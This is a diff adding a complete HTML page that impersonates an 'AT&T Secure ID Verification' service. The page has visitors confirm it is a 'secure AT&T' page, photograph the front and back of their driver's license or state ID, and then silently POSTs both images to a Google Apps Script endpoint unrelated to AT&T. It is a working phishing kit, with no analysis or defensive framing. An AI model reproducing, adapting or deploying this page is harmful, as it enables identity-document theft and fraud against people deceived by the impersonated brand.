@@ -1,0 +1,155 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>AT&T Secure ID Verification</title>
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #f1f1f6; margin: 0; padding: 0; }
+    .att-header { background-color: #0057b8; color: white; padding: 1rem; text-align: center; }
+    .container { max-width: 600px; margin: 2rem auto; background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+    .btn { background-color: #0057b8; color: white; border: none; padding: 0.8rem 1.5rem; border-radius: 5px; cursor: pointer; margin-top: 1rem; }
+    .tab { background: #e1e7f0; padding: 1rem; text-align: center; border-radius: 5px; cursor: pointer; font-weight: bold; transition: background 0.3s; margin: 1rem 0; }
+    .tab:hover { background: #cdd8e9; }
+    .hidden { display: none; }
+    video, canvas { width: 100%; border-radius: 10px; margin-top: 1rem; }
+    .success { text-align: center; color: green; font-weight: bold; font-size: 1.3rem; margin-top: 2rem; }
+    .checkmark { font-size: 3rem; color: green; animation: pop 0.4s ease-out; }
+    @keyframes pop { 0% { transform: scale(0.7); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+    .loader { border: 6px solid #f3f3f3; border-top: 6px solid #0057b8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 1rem auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    #loadingOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.8); display: none; align-items: center; justify-content: center; z-index: 999; font-weight: bold; font-size: 1.2rem; color: #0057b8; flex-direction: column; }
+  </style>
+</head>
+<body>
+  <div class="att-header">
+    <h1>AT&T Secure ID Verification</h1>
+  </div>
+
+  <div id="loadingOverlay">
+    <div class="loader"></div>
+    <div>Processing, please wait...</div>
+  </div>
+
+  <div class="container" id="termsScreen">
+    <h2>AT&T Terms and Conditions</h2>
+    <p>By using this ID verification service, you agree to provide accurate and truthful information. Your data will be used solely for identity verification purposes in accordance with AT&T’s Privacy Policy.</p>
+    <div style="display: flex; align-items: flex-start; margin-top: 1rem;">
+      <input type="checkbox" id="secureCheckbox" style="margin-top: 5px; margin-right: 10px;">
+      <label for="secureCheckbox">This is a secure AT&T verification page. Your information is protected and used solely for verification purposes.</label>
+    </div>
+    <button class="btn" onclick="verifySecureConsent()">I Agree & Continue</button>
+  </div>
+
+  <div class="container hidden" id="idTypeScreen">
+    <h2>Before You Begin</h2>
+    <div style="margin-bottom: 1rem;">
+      <input type="checkbox" id="consentCheckbox">
+      <label for="consentCheckbox">I confirm I’ve read and agree to AT&T's Terms and Conditions.</label>
+    </div>
+    <h3>Select Your Identification Type</h3>
+    <div class="tab" onclick="checkConsentAndStart('Driving License')">Driving License</div>
+    <div class="tab" onclick="checkConsentAndStart('State ID')">State ID</div>
+  </div>
+
+  <div class="container hidden" id="frontSideScreen">
+    <h2>Upload Front Side of <span id="idLabel1"></span></h2>
+    <video id="video1" autoplay playsinline></video>
+    <canvas id="canvas1" class="hidden"></canvas>
+    <button class="btn" onclick="takePhoto('front')">Capture</button>
+    <button class="btn" onclick="submitPhoto('front')">Submit Front</button>
+  </div>
+
+  <div class="container hidden" id="backSideScreen">
+    <h2>Upload Back Side of <span id="idLabel2"></span></h2>
+    <video id="video2" autoplay playsinline></video>
+    <canvas id="canvas2" class="hidden"></canvas>
+    <button class="btn" onclick="takePhoto('back')">Capture</button>
+    <button class="btn" onclick="submitPhoto('back')">Submit Back</button>
+  </div>
+
+  <div class="container hidden" id="finalScreen">
+    <div class="checkmark">✅</div>
+    <h2 class="success">Thank you for verifying with AT&T.<br/>Your ID has been successfully submitted.</h2>
+  </div>
+
+  <script>
+    let selectedID = '';
+    let frontImageData = '';
+    let backImageData = '';
+
+    function verifySecureConsent() {
+      if (!document.getElementById('secureCheckbox').checked) {
+        alert('Please confirm this is a secure AT&T verification page.');
+        return;
+      }
+      document.getElementById("termsScreen").classList.add("hidden");
+      document.getElementById("idTypeScreen").classList.remove("hidden");
+    }
+
+    function checkConsentAndStart(type) {
+      if (!document.getElementById('consentCheckbox').checked) {
+        alert('Please agree to the Terms and Conditions.');
+        return;
+      }
+      selectedID = type;
+      document.getElementById("idLabel1").textContent = selectedID;
+      document.getElementById("idTypeScreen").classList.add("hidden");
+      document.getElementById("frontSideScreen").classList.remove("hidden");
+      startCamera('front');
+    }
+
+    async function startCamera(side) {
+      const video = document.getElementById(side === 'front' ? 'video1' : 'video2');
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+      video.srcObject = stream;
+    }
+
+    function takePhoto(side) {
+      const video = document.getElementById(side === 'front' ? 'video1' : 'video2');
+      const canvas = document.getElementById(side === 'front' ? 'canvas1' : 'canvas2');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.classList.remove('hidden');
+      video.style.display = 'none';
+      const dataURL = canvas.toDataURL('image/jpeg');
+      if (side === 'front') frontImageData = dataURL;
+      else backImageData = dataURL;
+    }
+
+    function submitPhoto(side) {
+      document.getElementById("loadingOverlay").style.display = "flex";
+      setTimeout(() => {
+        document.getElementById("loadingOverlay").style.display = "none";
+        if (side === 'front') {
+          document.getElementById("frontSideScreen").classList.add("hidden");
+          document.getElementById("idLabel2").textContent = selectedID;
+          document.getElementById("backSideScreen").classList.remove("hidden");
+          startCamera('back');
+        } else {
+          document.getElementById("backSideScreen").classList.add("hidden");
+          document.getElementById("finalScreen").classList.remove("hidden");
+          sendToGoogleDrive();
+        }
+      }, 1500);
+    }
+
+    function sendToGoogleDrive() {
+      fetch("https://script.google.com/macros/s/AKfycbx-n8awu_Ex1vauIjzo1K6eaDfEcpwMFjZ4BkObZ3y-5nWyM9LoRQOc9kTaIyR99Ek5/exec", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          idType: selectedID,
+          frontImage: frontImageData,
+          backImage: backImageData
+        })
+      })
+      .then(res => res.text())
+      .then(data => console.log("✅ Submitted:", data))
+      .catch(err => console.error("❌ Failed:", err));
+    }
+  </script>
+</body>
+</html>
